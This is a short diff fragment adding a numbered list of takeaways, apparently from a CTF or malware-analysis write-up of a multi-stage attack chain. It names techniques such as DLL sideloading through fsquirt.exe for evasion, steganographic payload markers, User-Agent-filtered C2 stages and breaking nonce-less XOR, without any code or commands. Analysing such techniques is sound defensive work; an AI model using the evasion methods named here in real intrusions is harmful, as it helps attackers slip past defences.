+1. **Multi-stage attacks** require patient, methodical tracing of each hop in the delivery chain
+2. **Server-side encryption** can be cracked if the server doubles as an encryption oracle
+3. **DLL sideloading** using legitimate Windows binaries (`fsquirt.exe`) is a common evasion technique
+4. **Steganography** using known markers makes extraction straightforward once the format is understood
+5. **XOR encryption without a nonce/IV** is trivially broken with known or chosen plaintext
+6. **User-Agent filtering** at each stage simulates how malware C2 infrastructure validates requests
